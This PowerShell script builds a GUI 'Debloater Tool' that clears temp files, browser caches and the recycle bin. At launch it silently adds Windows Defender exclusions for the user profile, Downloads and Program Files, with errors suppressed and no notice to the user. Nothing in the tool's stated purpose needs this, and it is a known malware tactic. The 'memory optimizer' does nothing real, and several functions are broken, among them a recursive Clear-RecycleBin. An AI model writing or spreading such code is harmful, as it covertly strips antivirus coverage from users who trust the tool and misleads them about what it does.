# DebloaterGUI.ps1 - Modern Windows Forms GUI Version
# Debloater Tool v2.0 GUI by ! Star

# Check admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    [System.Windows.Forms.MessageBox]::Show("This application must be run as Administrator!", "Admin Required", "OK", "Error")
    exit
}

# Load required assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework

# Set progress preference
$ProgressPreference = 'SilentlyContinue'

# Add Windows Defender exclusions
try {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
} catch { }

# Global variables
$script:MainForm = $null
$script:StatusLabel = $null
$script:ProgressBar = $null
$script:LogTextBox = $null

# Utility Functions
function Write-Log {
    param([string]$Message, [string]$Color = "Black")

    $timestamp = Get-Date -Format "HH:mm:ss"
    $logMessage = "[$timestamp] $Message`r`n"

    if ($script:LogTextBox) {
        $script:LogTextBox.Invoke([System.Action]{
            $script:LogTextBox.AppendText($logMessage)
            $script:LogTextBox.ScrollToCaret()
        })
    }

    if ($script:StatusLabel) {
        $script:StatusLabel.Text = $Message
    }
}

function Update-Progress {
    param([int]$Value)
    if ($script:ProgressBar) {
        $script:ProgressBar.Value = [Math]::Min($Value, 100)
    }
}

function Show-CustomMessageBox {
    param(
        [string]$Message,
        [string]$Title = "Debloater Tool",
        [string]$Buttons = "OK",
        [string]$Icon = "Information"
    )
    return [System.Windows.Forms.MessageBox]::Show($Message, $Title, $Buttons, $Icon)
}

# Cleanup Functions
function Clear-TempFiles {
    param([array]$SelectedFolders)

    Write-Log "Starting temporary files cleanup..."
    Update-Progress 0

    $startTime = Get-Date
    $spaceBefore = (Get-PSDrive C).Free
    $totalDeleted = 0
    $folderIndex = 0

    foreach ($path in $SelectedFolders) {
        if (Test-Path $path) {
            Write-Log "Cleaning: $path"
            $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            $count = $items.Count
            $progress = 0

            foreach ($item in $items) {
                if (Test-Path $item.FullName) {
                    try { 
                        Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue
                        $totalDeleted++
                        $progress++

                        if ($count -gt 0) {
                            $percentComplete = [Math]::Round(($progress / $count) * 100)
                            Update-Progress $percentComplete
                        }
                    } catch { }
                }
            }
        }
        $folderIndex++
    }

    $spaceAfter = (Get-PSDrive C).Free
    $endTime = Get-Date
    $duration = ($endTime - $startTime).TotalSeconds
    $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB

    Update-Progress 100
    Write-Log "Cleanup completed!"

    $report = @"
========= Cleanup Report =========
Files deleted: $totalDeleted
Space freed: $([math]::Round($spaceFreed,2)) MB
Time taken: $([math]::Round($duration,2)) seconds
================================
"@

    Show-CustomMessageBox $report "Cleanup Complete"
}

function Clear-BrowserCache {
    param([string]$Browser)

    Write-Log "Clearing $Browser cache..."
    Update-Progress 0

    switch ($Browser) {
        "Chrome" {
            $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
            if (Test-Path $chromeCache) { 
                Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue
                Write-Log "Chrome cache cleared successfully!"
            } else {
                Write-Log "Chrome cache not found."
            }
        }
        "Edge" {
            $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
            if (Test-Path $edgeCache) { 
                Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue
                Write-Log "Edge cache cleared successfully!"
            } else {
                Write-Log "Edge cache not found."
            }
        }
        "Firefox" {
            $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
            $cacheItems = Get-ChildItem $firefoxCache -Recurse -Include cache2 -ErrorAction SilentlyContinue
            if ($cacheItems) {
                $cacheItems | ForEach-Object {
                    Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
                }
                Write-Log "Firefox cache cleared successfully!"
            } else {
                Write-Log "Firefox cache not found."
            }
        }
    }

    Update-Progress 100
}

function Optimize-Memory {
    Write-Log "Optimizing memory..."
    Update-Progress 25

    [System.GC]::Collect()
    Update-Progress 75
    [System.GC]::WaitForPendingFinalizers()
    Update-Progress 100

    Write-Log "Memory optimization completed!"
    Show-CustomMessageBox "Memory optimization completed successfully!" "Memory Optimizer"
}

function Clear-RecycleBin {
    Write-Log "Clearing Recycle Bin..."
    Update-Progress 0

    $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
    $driveCount = $drives.Count
    $currentDrive = 0

    foreach ($drive in $drives) {
        try {
            Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
            $currentDrive++
            Update-Progress ([Math]::Round(($currentDrive / $driveCount) * 100))
        } catch { }
    }

    Write-Log "Recycle Bin cleared successfully!"
    Show-CustomMessageBox "Recycle Bin cleared for all drives!" "Recycle Bin"
}

function Get-PublicIPInfo {
    param([string]$IPAddress = "")

    Write-Log "Getting IP information..."
    Update-Progress 25

    $url = if ([string]::IsNullOrWhiteSpace($IPAddress)) {
        "https://ipinfo.io/json"
    } else {
        "https://ipinfo.io/$IPAddress/json"
    }

    try {
        $response = Invoke-RestMethod -Uri $url -ErrorAction Stop
        Update-Progress 100

        $info = @"
========= IP Information =========
IP Address: $($response.ip)
Hostname: $($response.hostname)
City: $($response.city)
Region: $($response.region)
Country: $($response.country)
Location: $($response.loc)
Organization: $($response.org)
Postal Code: $($response.postal)
===============================
"@

        Show-CustomMessageBox $info "IP Information"
        Write-Log "IP information retrieved successfully!"
    } catch {
        Write-Log "Failed to retrieve IP information: $_"
        Show-CustomMessageBox "Failed to retrieve IP information." "Error" "OK" "Error"
    }
}

# GUI Creation Functions
function Create-MainForm {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "🚀 Debloater Tool v2.0 - By ! Star"
    $form.Size = New-Object System.Drawing.Size(800, 600)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedSingle"
    $form.MaximizeBox = $false
    $form.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
    $form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon("$env:SystemRoot\System32\cleanmgr.exe")

    return $form
}

function Create-HeaderPanel {
    $panel = New-Object System.Windows.Forms.Panel
    $panel.Size = New-Object System.Drawing.Size(780, 80)
    $panel.Location = New-Object System.Drawing.Point(10, 10)
    $panel.BackColor = [System.Drawing.Color]::FromArgb(70, 130, 180)

    # Title label
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = "🚀 Debloater Tool v2.0"
    $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
    $titleLabel.ForeColor = [System.Drawing.Color]::White
    $titleLabel.Location = New-Object System.Drawing.Point(20, 10)
    $titleLabel.AutoSize = $true
    $panel.Controls.Add($titleLabel)

    # Subtitle label
    $subtitleLabel = New-Object System.Windows.Forms.Label
    $subtitleLabel.Text = "Clean temp files, optimize system, clear browser cache"
    $subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
    $subtitleLabel.ForeColor = [System.Drawing.Color]::LightGray
    $subtitleLabel.Location = New-Object System.Drawing.Point(20, 45)
    $subtitleLabel.AutoSize = $true
    $panel.Controls.Add($subtitleLabel)

    return $panel
}

function Create-ButtonsPanel {
    $panel = New-Object System.Windows.Forms.Panel
    $panel.Size = New-Object System.Drawing.Size(780, 300)
    $panel.Location = New-Object System.Drawing.Point(10, 100)
    $panel.BackColor = [System.Drawing.Color]::White
    $panel.BorderStyle = "FixedSingle"

    # Create buttons
    $buttons = @(
        @{Text="🗂️ Clear Temp Files"; Action="TempFiles"; Color=[System.Drawing.Color]::FromArgb(46, 125, 50)},
        @{Text="🌐 Clear Browser Cache"; Action="BrowserCache"; Color=[System.Drawing.Color]::FromArgb(33, 150, 243)},
        @{Text="🗑️ Clear Recycle Bin"; Action="RecycleBin"; Color=[System.Drawing.Color]::FromArgb(156, 39, 176)},
        @{Text="🧠 Memory Optimizer"; Action="Memory"; Color=[System.Drawing.Color]::FromArgb(0, 188, 212)},
        @{Text="🌍 Get IP Information"; Action="IPInfo"; Color=[System.Drawing.Color]::FromArgb(255, 152, 0)},
        @{Text="⚡ Full Cleanup"; Action="FullCleanup"; Color=[System.Drawing.Color]::FromArgb(244, 67, 54)},
        @{Text="📱 Windows Apps"; Action="WindowsApps"; Color=[System.Drawing.Color]::FromArgb(76, 175, 80)},
        @{Text="🔧 Startup Manager"; Action="StartupManager"; Color=[System.Drawing.Color]::FromArgb(63, 81, 181)},
        @{Text="❌ Exit"; Action="Exit"; Color=[System.Drawing.Color]::FromArgb(96, 125, 139)}
    )

    $x = 20
    $y = 20
    $buttonWidth = 230
    $buttonHeight = 45
    $spacing = 15

    foreach ($buttonInfo in $buttons) {
        $button = New-Object System.Windows.Forms.Button
        $button.Text = $buttonInfo.Text
        $button.Size = New-Object System.Drawing.Size($buttonWidth, $buttonHeight)
        $button.Location = New-Object System.Drawing.Point($x, $y)
        $button.BackColor = $buttonInfo.Color
        $button.ForeColor = [System.Drawing.Color]::White
        $button.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
        $button.FlatStyle = "Flat"
        $button.FlatAppearance.BorderSize = 0
        $button.Cursor = "Hand"

        # Add hover effects
        $originalColor = $buttonInfo.Color
        $button.Add_MouseEnter({
            $this.BackColor = [System.Drawing.Color]::FromArgb([Math]::Min(255, $originalColor.R + 20), 
                                                              [Math]::Min(255, $originalColor.G + 20), 
                                                              [Math]::Min(255, $originalColor.B + 20))
        })
        $button.Add_MouseLeave({
            $this.BackColor = $originalColor
        })

        # Add click events
        $action = $buttonInfo.Action
        $button.Add_Click({
            Handle-ButtonClick $action
        }.GetNewClosure())

        $panel.Controls.Add($button)

        # Position next button
        $x += $buttonWidth + $spacing
        if ($x + $buttonWidth > 750) {
            $x = 20
            $y += $buttonHeight + $spacing
        }
    }

    return $panel
}

function Create-StatusPanel {
    $panel = New-Object System.Windows.Forms.Panel
    $panel.Size = New-Object System.Drawing.Size(780, 180)
    $panel.Location = New-Object System.Drawing.Point(10, 410)
    $panel.BackColor = [System.Drawing.Color]::White
    $panel.BorderStyle = "FixedSingle"

    # Status label
    $script:StatusLabel = New-Object System.Windows.Forms.Label
    $script:StatusLabel.Text = "Ready"
    $script:StatusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
    $script:StatusLabel.Location = New-Object System.Drawing.Point(10, 10)
    $script:StatusLabel.AutoSize = $true
    $panel.Controls.Add($script:StatusLabel)

    # Progress bar
    $script:ProgressBar = New-Object System.Windows.Forms.ProgressBar
    $script:ProgressBar.Size = New-Object System.Drawing.Size(760, 25)
    $script:ProgressBar.Location = New-Object System.Drawing.Point(10, 35)
    $script:ProgressBar.Style = "Continuous"
    $panel.Controls.Add($script:ProgressBar)

    # Log text box
    $script:LogTextBox = New-Object System.Windows.Forms.TextBox
    $script:LogTextBox.Multiline = $true
    $script:LogTextBox.ScrollBars = "Vertical"
    $script:LogTextBox.Size = New-Object System.Drawing.Size(760, 110)
    $script:LogTextBox.Location = New-Object System.Drawing.Point(10, 65)
    $script:LogTextBox.Font = New-Object System.Drawing.Font("Consolas", 9)
    $script:LogTextBox.ReadOnly = $true
    $script:LogTextBox.BackColor = [System.Drawing.Color]::FromArgb(248, 248, 248)
    $panel.Controls.Add($script:LogTextBox)

    return $panel
}

# Event Handlers
function Handle-ButtonClick {
    param([string]$Action)

    switch ($Action) {
        "TempFiles" {
            Show-TempFilesDialog
        }
        "BrowserCache" {
            Show-BrowserCacheDialog
        }
        "RecycleBin" {
            $result = Show-CustomMessageBox "Are you sure you want to clear the Recycle Bin?" "Confirm Action" "YesNo" "Question"
            if ($result -eq "Yes") {
                Clear-RecycleBin
            }
        }
        "Memory" {
            $result = Show-CustomMessageBox "Optimize system memory now?" "Memory Optimizer" "YesNo" "Question"
            if ($result -eq "Yes") {
                Optimize-Memory
            }
        }
        "IPInfo" {
            Show-IPInfoDialog
        }
        "FullCleanup" {
            $result = Show-CustomMessageBox "This will clear all temporary files, browser cache, and recycle bin. Continue?" "Full Cleanup" "YesNo" "Warning"
            if ($result -eq "Yes") {
                Perform-FullCleanup
            }
        }
        "WindowsApps" {
            Show-CustomMessageBox "Windows Apps manager coming in future update!" "Feature Coming Soon"
        }
        "StartupManager" {
            Show-CustomMessageBox "Startup manager coming in future update!" "Feature Coming Soon"
        }
        "Exit" {
            $script:MainForm.Close()
        }
    }
}

function Show-TempFilesDialog {
    $dialog = New-Object System.Windows.Forms.Form
    $dialog.Text = "Select Temp Folders"
    $dialog.Size = New-Object System.Drawing.Size(400, 300)
    $dialog.StartPosition = "CenterParent"
    $dialog.FormBorderStyle = "FixedDialog"
    $dialog.MaximizeBox = $false
    $dialog.MinimizeBox = $false

    # Checkboxes
    $checkBoxes = @()
    $folders = @(
        @{Name="TEMP folder"; Path=$env:TEMP},
        @{Name="Local Temp"; Path="$env:USERPROFILE\AppData\Local\Temp"},
        @{Name="Windows Temp"; Path="C:\Windows\Temp"},
        @{Name="Prefetch"; Path="C:\Windows\Prefetch"}
    )

    $y = 20
    foreach ($folder in $folders) {
        $checkBox = New-Object System.Windows.Forms.CheckBox
        $checkBox.Text = $folder.Name
        $checkBox.Location = New-Object System.Drawing.Point(20, $y)
        $checkBox.Size = New-Object System.Drawing.Size(350, 25)
        $checkBox.Tag = $folder.Path
        $checkBox.Checked = $true
        $checkBoxes += $checkBox
        $dialog.Controls.Add($checkBox)
        $y += 30
    }

    # Buttons
    $okButton = New-Object System.Windows.Forms.Button
    $okButton.Text = "Clean Selected"
    $okButton.Location = New-Object System.Drawing.Point(200, 200)
    $okButton.Size = New-Object System.Drawing.Size(100, 30)
    $okButton.BackColor = [System.Drawing.Color]::FromArgb(46, 125, 50)
    $okButton.ForeColor = [System.Drawing.Color]::White
    $okButton.Add_Click({
        $selectedPaths = @()
        foreach ($cb in $checkBoxes) {
            if ($cb.Checked) {
                $selectedPaths += $cb.Tag
            }
        }
        if ($selectedPaths.Count -gt 0) {
            $dialog.DialogResult = "OK"
            $dialog.Tag = $selectedPaths
        } else {
            Show-CustomMessageBox "Please select at least one folder!" "No Selection" "OK" "Warning"
        }
    })
    $dialog.Controls.Add($okButton)

    $cancelButton = New-Object System.Windows.Forms.Button
    $cancelButton.Text = "Cancel"
    $cancelButton.Location = New-Object System.Drawing.Point(310, 200)
    $cancelButton.Size = New-Object System.Drawing.Size(70, 30)
    $cancelButton.Add_Click({ $dialog.DialogResult = "Cancel" })
    $dialog.Controls.Add($cancelButton)

    $result = $dialog.ShowDialog()
    if ($result -eq "OK") {
        Clear-TempFiles $dialog.Tag
    }
    $dialog.Dispose()
}

function Show-BrowserCacheDialog {
    $dialog = New-Object System.Windows.Forms.Form
    $dialog.Text = "Select Browser"
    $dialog.Size = New-Object System.Drawing.Size(300, 200)
    $dialog.StartPosition = "CenterParent"
    $dialog.FormBorderStyle = "FixedDialog"
    $dialog.MaximizeBox = $false
    $dialog.MinimizeBox = $false

    $browsers = @("Chrome", "Edge", "Firefox")
    $y = 20

    foreach ($browser in $browsers) {
        $button = New-Object System.Windows.Forms.Button
        $button.Text = "Clear $browser Cache"
        $button.Location = New-Object System.Drawing.Point(50, $y)
        $button.Size = New-Object System.Drawing.Size(200, 35)
        $button.BackColor = [System.Drawing.Color]::FromArgb(33, 150, 243)
        $button.ForeColor = [System.Drawing.Color]::White
        $button.Add_Click({
            Clear-BrowserCache $browser
            $dialog.Close()
        }.GetNewClosure())
        $dialog.Controls.Add($button)
        $y += 45
    }

    $dialog.ShowDialog()
    $dialog.Dispose()
}

function Show-IPInfoDialog {
    $dialog = New-Object System.Windows.Forms.Form
    $dialog.Text = "IP Information"
    $dialog.Size = New-Object System.Drawing.Size(350, 150)
    $dialog.StartPosition = "CenterParent"
    $dialog.FormBorderStyle = "FixedDialog"
    $dialog.MaximizeBox = $false
    $dialog.MinimizeBox = $false

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "Enter IP address (leave blank for your IP):"
    $label.Location = New-Object System.Drawing.Point(20, 20)
    $label.AutoSize = $true
    $dialog.Controls.Add($label)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Location = New-Object System.Drawing.Point(20, 45)
    $textBox.Size = New-Object System.Drawing.Size(300, 25)
    $dialog.Controls.Add($textBox)

    $okButton = New-Object System.Windows.Forms.Button
    $okButton.Text = "Get Info"
    $okButton.Location = New-Object System.Drawing.Point(180, 80)
    $okButton.Size = New-Object System.Drawing.Size(80, 30)
    $okButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
    $okButton.ForeColor = [System.Drawing.Color]::White
    $okButton.Add_Click({
        Get-PublicIPInfo $textBox.Text
        $dialog.Close()
    })
    $dialog.Controls.Add($okButton)

    $cancelButton = New-Object System.Windows.Forms.Button
    $cancelButton.Text = "Cancel"
    $cancelButton.Location = New-Object System.Drawing.Point(270, 80)
    $cancelButton.Size = New-Object System.Drawing.Size(60, 30)
    $cancelButton.Add_Click({ $dialog.Close() })
    $dialog.Controls.Add($cancelButton)

    $dialog.ShowDialog()
    $dialog.Dispose()
}

function Perform-FullCleanup {
    Write-Log "Starting full system cleanup..."

    # Clear temp files
    $folders = @($env:TEMP, "$env:USERPROFILE\AppData\Local\Temp", "C:\Windows\Temp", "C:\Windows\Prefetch")
    Clear-TempFiles $folders

    # Clear browser caches
    Clear-BrowserCache "Chrome"
    Clear-BrowserCache "Edge"
    Clear-BrowserCache "Firefox"

    # Clear recycle bin
    Clear-RecycleBin

    # Optimize memory
    Optimize-Memory

    Write-Log "Full cleanup completed!"
}

# Main execution
function Start-DebloaterGUI {
    # Create main form
    $script:MainForm = Create-MainForm

    # Add panels
    $headerPanel = Create-HeaderPanel
    $buttonsPanel = Create-ButtonsPanel
    $statusPanel = Create-StatusPanel

    $script:MainForm.Controls.Add($headerPanel)
    $script:MainForm.Controls.Add($buttonsPanel)
    $script:MainForm.Controls.Add($statusPanel)

    # Initialize log
    Write-Log "Debloater Tool GUI v2.0 initialized successfully!"
    Write-Log "Ready for cleanup operations."

    # Show form
    [System.Windows.Forms.Application]::EnableVisualStyles()
    [System.Windows.Forms.Application]::Run($script:MainForm)
}

# Start the GUI
Start-DebloaterGUI
